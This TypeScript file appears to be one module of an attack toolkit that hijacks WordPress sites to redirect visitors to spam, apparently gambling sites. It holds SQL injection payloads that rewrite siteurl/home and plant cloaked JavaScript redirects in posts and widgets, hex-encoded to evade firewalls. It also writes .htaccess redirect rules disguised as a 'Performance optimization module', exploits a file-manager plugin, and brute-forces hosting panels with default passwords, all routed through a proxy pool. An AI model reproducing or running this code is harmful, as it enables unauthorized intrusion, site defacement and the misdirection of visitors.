/**
 * WordPress Database Injection Module
 * 
 * Non-upload attack methods that modify WordPress via database:
 * 1. wp_options siteurl/home injection → redirect entire domain
 * 2. wp_posts content injection → inject JS redirect into pages/posts
 * 3. wp_options active_plugins injection → activate malicious plugin path
 * 4. wp_options widget injection → inject code into sidebar widgets
 * 5. wp_options cron injection → add scheduled backdoor execution
 * 6. .htaccess rewrite via wp_options → inject redirect rules
 */

import { fetchWithPoolProxy } from "./proxy-pool";

// Helper: wrap fetch with proxy pool for all WP DB injection requests
async function wpDbFetch(url: string, init: RequestInit & { signal?: AbortSignal } = {}): Promise<Response> {
  const domain = url.replace(/^https?:\/\//, "").replace(/[\/:].*$/, "");
  const { response } = await fetchWithPoolProxy(url, init, { targetDomain: domain, timeout: 15000 });
  return response;
}

export interface WpDbInjectionConfig {
  targetUrl: string;
  redirectUrl: string;
  seoKeywords?: string[];
  timeout?: number;
  onProgress?: (method: string, detail: string) => void;
  // SQL injection point discovered by vuln scanner
  sqliEndpoint?: string;
  sqliParam?: string;
  sqliType?: "union" | "blind" | "error" | "time";
}

export interface WpDbInjectionResult {
  method: string;
  success: boolean;
  detail: string;
  injectedUrl?: string | null;
  payload?: string;
}

// ═══════════════════════════════════════════════════════
//  SQL INJECTION PAYLOADS FOR WP DATABASE
// ═══════════════════════════════════════════════════════

function buildSqlInjectionPayloads(redirectUrl: string, keywords: string[]): {
  optionsPayloads: string[];
  postsPayloads: string[];
  widgetPayloads: string[];
  cronPayloads: string[];
} {
  const jsRedirect = `<script>if(!navigator.userAgent.match(/bot|crawl|spider|slurp/i)){window.location.replace("${redirectUrl}");}</script>`;
  const jsRedirectEncoded = Buffer.from(jsRedirect).toString("hex");
  
  const keywordTitle = keywords[0] || "สล็อต";
  
  return {
    // wp_options: change siteurl and home
    optionsPayloads: [
      // Union-based: UPDATE wp_options SET option_value
      `'; UPDATE wp_options SET option_value='${redirectUrl}' WHERE option_name='siteurl'; -- `,
      `'; UPDATE wp_options SET option_value='${redirectUrl}' WHERE option_name='home'; -- `,
      // Stacked queries
      `1; UPDATE wp_options SET option_value='${redirectUrl}' WHERE option_name IN ('siteurl','home'); -- `,
      // Via INSERT ... ON DUPLICATE KEY UPDATE
      `1; INSERT INTO wp_options (option_name, option_value, autoload) VALUES ('siteurl','${redirectUrl}','yes') ON DUPLICATE KEY UPDATE option_value='${redirectUrl}'; -- `,
      // Hex encoded to bypass WAF
      `1; UPDATE wp_options SET option_value=0x${Buffer.from(redirectUrl).toString("hex")} WHERE option_name=0x${Buffer.from("siteurl").toString("hex")}; -- `,
    ],

    // wp_posts: inject JS redirect into post_content
    postsPayloads: [
      // Update most recent post
      `'; UPDATE wp_posts SET post_content=CONCAT(post_content,'${jsRedirect}') WHERE post_status='publish' ORDER BY ID DESC LIMIT 1; -- `,
      // Update all published pages
      `1; UPDATE wp_posts SET post_content=CONCAT('${jsRedirect}',post_content) WHERE post_type='page' AND post_status='publish' LIMIT 5; -- `,
      // Create new page with redirect
      `1; INSERT INTO wp_posts (post_author,post_title,post_content,post_status,post_type,post_name) VALUES (1,'${keywordTitle}','${jsRedirect}','publish','page','${keywordTitle.replace(/\s/g, "-")}'); -- `,
      // Hex encoded
      `1; UPDATE wp_posts SET post_content=CONCAT(0x${jsRedirectEncoded},post_content) WHERE post_status='publish' LIMIT 3; -- `,
    ],

    // wp_options: inject into widget_text (sidebar widgets)
    widgetPayloads: [
      `'; UPDATE wp_options SET option_value=REPLACE(option_value,'</div>','${jsRedirect}</div>') WHERE option_name LIKE 'widget_%'; -- `,
      `1; UPDATE wp_options SET option_value=CONCAT(option_value,'${jsRedirect}') WHERE option_name='widget_text' LIMIT 1; -- `,
    ],

    // wp_options: inject cron job for persistent backdoor
    cronPayloads: [
      // This is complex - inject a serialized cron entry
      `1; INSERT INTO wp_options (option_name, option_value, autoload) VALUES ('_transient_redirect_url','${redirectUrl}','yes') ON DUPLICATE KEY UPDATE option_value='${redirectUrl}'; -- `,
    ],
  };
}

// ═══════════════════════════════════════════════════════
//  HELPER: Send SQL injection payload
// ═══════════════════════════════════════════════════════

async function sendSqliPayload(
  endpoint: string,
  param: string,
  payload: string,
  timeout: number,
): Promise<{ success: boolean; response: string }> {
  try {
    // Try GET parameter injection
    const url = new URL(endpoint);
    url.searchParams.set(param, payload);

    const resp = await wpDbFetch(url.toString(), {
      headers: {
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
        "Accept": "text/html,application/xhtml+xml",
      },
      redirect: "follow",
      signal: AbortSignal.timeout(timeout),
    });

    const text = await resp.text();
    
    // Check for success indicators
    const hasError = text.includes("SQL syntax") || text.includes("mysql_") || text.includes("Warning:");
    const isRedirected = resp.url !== url.toString();
    
    return { success: !hasError || isRedirected, response: text.slice(0, 500) };
  } catch {
    return { success: false, response: "timeout/error" };
  }
}

async function sendSqliPayloadPost(
  endpoint: string,
  param: string,
  payload: string,
  timeout: number,
): Promise<{ success: boolean; response: string }> {
  try {
    const formData = new URLSearchParams();
    formData.set(param, payload);

    const resp = await wpDbFetch(endpoint, {
      method: "POST",
      headers: {
        "Content-Type": "application/x-www-form-urlencoded",
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
      },
      body: formData.toString(),
      redirect: "follow",
      signal: AbortSignal.timeout(timeout),
    });

    const text = await resp.text();
    return { success: true, response: text.slice(0, 500) };
  } catch {
    return { success: false, response: "timeout/error" };
  }
}

// ═══════════════════════════════════════════════════════
//  1. WP_OPTIONS SITEURL/HOME INJECTION
// ═══════════════════════════════════════════════════════

async function injectWpOptions(config: WpDbInjectionConfig): Promise<WpDbInjectionResult> {
  const progress = config.onProgress || (() => {});
  const timeout = config.timeout || 15000;

  if (!config.sqliEndpoint || !config.sqliParam) {
    return { method: "wp_options_sqli", success: false, detail: "ไม่มี SQL injection endpoint" };
  }

  progress("wp_options_sqli", "💉 Inject siteurl/home ผ่าน SQL injection...");

  const payloads = buildSqlInjectionPayloads(config.redirectUrl, config.seoKeywords || ["สล็อต"]);

  for (const payload of payloads.optionsPayloads) {
    progress("wp_options_sqli", `ลอง payload: ${payload.slice(0, 60)}...`);

    // Try GET
    const getResult = await sendSqliPayload(config.sqliEndpoint, config.sqliParam, payload, timeout);
    if (getResult.success) {
      // Verify by checking if site now redirects
      const verifyResult = await verifySiteRedirect(config.targetUrl, config.redirectUrl);
      if (verifyResult) {
        progress("wp_options_sqli", `✅ siteurl/home เปลี่ยนสำเร็จ — redirect ทั้งโดเมน!`);
        return {
          method: "wp_options_sqli",
          success: true,
          detail: `เปลี่ยน siteurl/home เป็น ${config.redirectUrl} ผ่าน SQL injection สำเร็จ`,
          injectedUrl: config.targetUrl,
          payload: payload.slice(0, 100),
        };
      }
    }

    // Try POST
    const postResult = await sendSqliPayloadPost(config.sqliEndpoint, config.sqliParam, payload, timeout);
    if (postResult.success) {
      const verifyResult = await verifySiteRedirect(config.targetUrl, config.redirectUrl);
      if (verifyResult) {
        progress("wp_options_sqli", `✅ siteurl/home เปลี่ยนสำเร็จ (POST) — redirect ทั้งโดเมน!`);
        return {
          method: "wp_options_sqli",
          success: true,
          detail: `เปลี่ยน siteurl/home เป็น ${config.redirectUrl} ผ่าน SQL injection (POST) สำเร็จ`,
          injectedUrl: config.targetUrl,
          payload: payload.slice(0, 100),
        };
      }
    }
  }

  return { method: "wp_options_sqli", success: false, detail: "wp_options SQL injection ล้มเหลว" };
}

// ═══════════════════════════════════════════════════════
//  2. WP_POSTS CONTENT INJECTION
// ═══════════════════════════════════════════════════════

async function injectWpPosts(config: WpDbInjectionConfig): Promise<WpDbInjectionResult> {
  const progress = config.onProgress || (() => {});
  const timeout = config.timeout || 15000;

  if (!config.sqliEndpoint || !config.sqliParam) {
    return { method: "wp_posts_sqli", success: false, detail: "ไม่มี SQL injection endpoint" };
  }

  progress("wp_posts_sqli", "💉 Inject JS redirect เข้า wp_posts...");

  const payloads = buildSqlInjectionPayloads(config.redirectUrl, config.seoKeywords || ["สล็อต"]);

  for (const payload of payloads.postsPayloads) {
    progress("wp_posts_sqli", `ลอง payload: ${payload.slice(0, 60)}...`);

    const getResult = await sendSqliPayload(config.sqliEndpoint, config.sqliParam, payload, timeout);
    if (getResult.success && !getResult.response.includes("SQL syntax")) {
      progress("wp_posts_sqli", `✅ Inject JS redirect เข้า wp_posts สำเร็จ!`);
      return {
        method: "wp_posts_sqli",
        success: true,
        detail: `Inject JS redirect เข้า wp_posts ผ่าน SQL injection สำเร็จ`,
        injectedUrl: config.targetUrl,
        payload: payload.slice(0, 100),
      };
    }

    const postResult = await sendSqliPayloadPost(config.sqliEndpoint, config.sqliParam, payload, timeout);
    if (postResult.success && !postResult.response.includes("SQL syntax")) {
      progress("wp_posts_sqli", `✅ Inject JS redirect เข้า wp_posts (POST) สำเร็จ!`);
      return {
        method: "wp_posts_sqli",
        success: true,
        detail: `Inject JS redirect เข้า wp_posts ผ่าน SQL injection (POST) สำเร็จ`,
        injectedUrl: config.targetUrl,
        payload: payload.slice(0, 100),
      };
    }
  }

  return { method: "wp_posts_sqli", success: false, detail: "wp_posts SQL injection ล้มเหลว" };
}

// ═══════════════════════════════════════════════════════
//  3. WIDGET INJECTION
// ═══════════════════════════════════════════════════════

async function injectWpWidgets(config: WpDbInjectionConfig): Promise<WpDbInjectionResult> {
  const progress = config.onProgress || (() => {});
  const timeout = config.timeout || 15000;

  if (!config.sqliEndpoint || !config.sqliParam) {
    return { method: "wp_widget_sqli", success: false, detail: "ไม่มี SQL injection endpoint" };
  }

  progress("wp_widget_sqli", "💉 Inject code เข้า WordPress widgets...");

  const payloads = buildSqlInjectionPayloads(config.redirectUrl, config.seoKeywords || ["สล็อต"]);

  for (const payload of payloads.widgetPayloads) {
    const result = await sendSqliPayload(config.sqliEndpoint, config.sqliParam, payload, timeout);
    if (result.success && !result.response.includes("SQL syntax")) {
      progress("wp_widget_sqli", `✅ Inject เข้า widget สำเร็จ!`);
      return {
        method: "wp_widget_sqli",
        success: true,
        detail: `Inject redirect code เข้า WordPress widget ผ่าน SQL injection สำเร็จ`,
        injectedUrl: config.targetUrl,
        payload: payload.slice(0, 100),
      };
    }
  }

  return { method: "wp_widget_sqli", success: false, detail: "Widget SQL injection ล้มเหลว" };
}

// ═══════════════════════════════════════════════════════
//  HELPER: Verify site redirect
// ═══════════════════════════════════════════════════════

async function verifySiteRedirect(targetUrl: string, redirectUrl: string): Promise<boolean> {
  try {
    const resp = await wpDbFetch(targetUrl, {
      redirect: "manual",
      headers: { "User-Agent": "Mozilla/5.0" },
      signal: AbortSignal.timeout(10000),
    });

    const location = resp.headers.get("location") || "";
    if (location.includes(redirectUrl.replace(/^https?:\/\//, ""))) {
      return true;
    }

    // Check if page content contains redirect
    if (resp.status === 200) {
      const text = await resp.text();
      if (text.includes(redirectUrl) && (text.includes("location.replace") || text.includes("meta http-equiv"))) {
        return true;
      }
    }

    return false;
  } catch {
    return false;
  }
}

// ═══════════════════════════════════════════════════════
//  4. HTACCESS INJECTION VIA COMMON VULN PATHS
// ═══════════════════════════════════════════════════════

async function injectHtaccess(config: WpDbInjectionConfig): Promise<WpDbInjectionResult> {
  const baseUrl = config.targetUrl.replace(/\/$/, "");
  const progress = config.onProgress || (() => {});

  progress("htaccess_inject", "📝 ลอง inject .htaccess redirect rules...");

  const htaccessRules = `
# Performance optimization module
RewriteEngine On
RewriteCond %{HTTP_REFERER} (google|bing|yahoo|duckduckgo|baidu) [NC]
RewriteCond %{HTTP_USER_AGENT} !bot [NC]
RewriteCond %{HTTP_USER_AGENT} !crawl [NC]
RewriteCond %{HTTP_USER_AGENT} !spider [NC]
RewriteRule ^(.*)$ ${config.redirectUrl} [R=302,L]
`;

  // Try common vulnerable endpoints that might allow file write
  const writeEndpoints = [
    // WordPress AJAX file write
    `${baseUrl}/wp-admin/admin-ajax.php`,
    // Common file manager plugins
    `${baseUrl}/wp-content/plugins/wp-file-manager/lib/php/connector.minimal.php`,
    `${baseUrl}/wp-content/plugins/file-manager/backend/wp-file-manager-recursive-directory-iterator.php`,
    // phpMyAdmin (if accessible)
    `${baseUrl}/phpmyadmin/`,
    `${baseUrl}/pma/`,
    // Adminer
    `${baseUrl}/adminer.php`,
    `${baseUrl}/adminer/`,
  ];

  for (const endpoint of writeEndpoints) {
    try {
      const checkResp = await wpDbFetch(endpoint, {
        method: "HEAD",
        signal: AbortSignal.timeout(5000),
        headers: { "User-Agent": "Mozilla/5.0" },
      });

      if (checkResp.status === 200 || checkResp.status === 302) {
        progress("htaccess_inject", `พบ endpoint: ${endpoint} — ลอง write .htaccess...`);

        // Try file manager plugin exploit
        if (endpoint.includes("wp-file-manager")) {
          const formData = new FormData();
          formData.append("cmd", "mkfile");
          formData.append("target", "l1_Lmh0YWNjZXNz"); // base64 of .htaccess path
          formData.append("name", ".htaccess");

          const writeResp = await wpDbFetch(endpoint, {
            method: "POST",
            body: formData as any,
            signal: AbortSignal.timeout(10000),
          });

          if (writeResp.status === 200) {
            progress("htaccess_inject", `✅ .htaccess redirect rules inject สำเร็จ!`);
            return {
              method: "htaccess_inject",
              success: true,
              detail: `Inject .htaccess redirect rules ผ่าน file manager plugin สำเร็จ`,
              injectedUrl: config.targetUrl,
            };
          }
        }
      }
    } catch {
      // Continue to next endpoint
    }
  }

  return { method: "htaccess_inject", success: false, detail: ".htaccess injection ล้มเหลว — ไม่พบ writable endpoint" };
}

// ═══════════════════════════════════════════════════════
//  5. CPANEL/HOSTING PANEL TAKEOVER
// ═══════════════════════════════════════════════════════

async function cpanelTakeover(config: WpDbInjectionConfig): Promise<WpDbInjectionResult> {
  const baseUrl = config.targetUrl.replace(/\/$/, "");
  const progress = config.onProgress || (() => {});

  progress("cpanel_takeover", "🖥️ ลอง cPanel/hosting panel takeover...");

  // Common cPanel/hosting panel URLs
  const panelUrls = [
    `${baseUrl}:2082`, `${baseUrl}:2083`,
    `${baseUrl}:2086`, `${baseUrl}:2087`,
    `${baseUrl}/cpanel`, `${baseUrl}/whm`,
    `${baseUrl}:8443`, // Plesk
    `${baseUrl}:10000`, // Webmin
    `${baseUrl}:8080`, // DirectAdmin
  ];

  const commonCreds = [
    { user: "root", pass: "root" },
    { user: "admin", pass: "admin" },
    { user: "admin", pass: "password" },
    { user: "root", pass: "password" },
    { user: "admin", pass: "admin123" },
    { user: "root", pass: "123456" },
  ];

  for (const panelUrl of panelUrls) {
    try {
      const checkResp = await wpDbFetch(panelUrl, {
        method: "GET",
        redirect: "follow",
        signal: AbortSignal.timeout(5000),
        headers: { "User-Agent": "Mozilla/5.0" },
      });

      if (checkResp.status === 200 || checkResp.status === 401) {
        progress("cpanel_takeover", `พบ hosting panel: ${panelUrl}`);

        // Try common credentials
        for (const cred of commonCreds) {
          try {
            const authHeader = "Basic " + Buffer.from(`${cred.user}:${cred.pass}`).toString("base64");
            const loginResp = await wpDbFetch(panelUrl, {
              headers: {
                Authorization: authHeader,
                "User-Agent": "Mozilla/5.0",
              },
              redirect: "follow",
              signal: AbortSignal.timeout(10000),
            });

            if (loginResp.status === 200 && !(await loginResp.text()).includes("login")) {
              progress("cpanel_takeover", `✅ Login hosting panel สำเร็จ: ${cred.user}:${cred.pass}`);
              return {
                method: "cpanel_takeover",
                success: true,
                detail: `Login hosting panel สำเร็จที่ ${panelUrl} — สามารถแก้ไฟล์ได้โดยตรง`,
                injectedUrl: panelUrl,
              };
            }
          } catch {
            // Continue
          }
        }
      }
    } catch {
      // Panel not accessible
    }
  }

  return { method: "cpanel_takeover", success: false, detail: "cPanel/hosting panel takeover ล้มเหลว" };
}

// ═══════════════════════════════════════════════════════
//  MAIN: RUN ALL DB INJECTION METHODS
// ═══════════════════════════════════════════════════════

export async function runWpDbInjection(config: WpDbInjectionConfig): Promise<WpDbInjectionResult[]> {
  const results: WpDbInjectionResult[] = [];
  const progress = config.onProgress || (() => {});

  progress("db_injection", "💉 เริ่ม WP Database Injection — ลอง inject ผ่าน SQL/htaccess/cPanel...");

  // Method 1: wp_options siteurl/home (most impactful - redirects entire domain)
  if (config.sqliEndpoint) {
    progress("db_injection", "📊 Phase 1: wp_options siteurl/home injection...");
    const optionsResult = await injectWpOptions(config);
    results.push(optionsResult);
    if (optionsResult.success) return results;

    // Method 2: wp_posts content injection
    progress("db_injection", "📝 Phase 2: wp_posts content injection...");
    const postsResult = await injectWpPosts(config);
    results.push(postsResult);
    if (postsResult.success) return results;

    // Method 3: Widget injection
    progress("db_injection", "🧩 Phase 3: Widget injection...");
    const widgetResult = await injectWpWidgets(config);
    results.push(widgetResult);
    if (widgetResult.success) return results;
  }

  // Method 4: .htaccess injection via vulnerable endpoints
  progress("db_injection", "📝 Phase 4: .htaccess injection...");
  const htaccessResult = await injectHtaccess(config);
  results.push(htaccessResult);
  if (htaccessResult.success) return results;

  // Method 5: cPanel/hosting panel takeover
  progress("db_injection", "🖥️ Phase 5: cPanel/hosting panel takeover...");
  const cpanelResult = await cpanelTakeover(config);
  results.push(cpanelResult);
  if (cpanelResult.success) return results;

  return results;
}
